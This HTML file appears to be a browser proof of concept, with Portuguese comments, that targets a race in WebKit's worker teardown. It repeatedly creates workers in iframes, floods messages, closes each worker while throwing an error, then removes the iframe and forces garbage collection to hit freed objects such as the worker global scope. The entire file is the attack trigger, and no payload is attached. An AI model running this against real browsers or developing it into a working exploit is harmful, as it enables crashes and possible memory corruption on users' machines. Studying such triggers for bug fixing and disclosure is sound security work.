<!DOCTYPE html>
<html>
<body>
<script>
const workerCode = `
  self.onmessage = function(e) {
    // 1. Enfileira múltiplas tasks na thread principal via postTask([this, ...])
    // que não verificam m_askedToTerminate (como postExceptionToWorkerObject)
    // ou que acessam m_pageInspector / m_scriptExecutionContext.
    for (let i = 0; i < 50; i++) {
      postMessage({ idx: i, buf: new ArrayBuffer(64) });
      console.log("msg", i);
    }

    // 2. Dispara erro assíncrono + encerramento imediato da thread.
    // Quando m_workerGlobalScope = nullptr rodar na thread do worker,
    // ele postará workerGlobalScopeDestroyed() para a thread principal.
    setTimeout(() => {
      self.close();
      throw new Error("trigger_postExceptionToWorkerObject");
    }, 0);
  };
`;

const blobURL = URL.createObjectURL(new Blob([workerCode], { type: "application/javascript" }));

function triggerGC() {
  for (let i = 0; i < 64; i++) {
    new ArrayBuffer(1024 * 1024);
  }
}

function runIteration() {
  const iframe = document.createElement("iframe");
  document.body.appendChild(iframe);

  const w = new iframe.contentWindow.Worker(blobURL);
  w.postMessage("start");

  // Assim que a primeira mensagem voltar, garantimos que o worker já rodou
  // e enfileirou as demais tasks + self.close().
  w.onmessage = () => {
    w.onmessage = null;

    // Remove o iframe ou limpa o documento para forçar ScriptExecutionContext::stopActiveDOMObjects()
    // -> Worker::stop() -> workerObjectDestroyed()
    iframe.remove();
    triggerGC();
  };
}

setInterval(runIteration, 40);
</script>
</body>
</html>
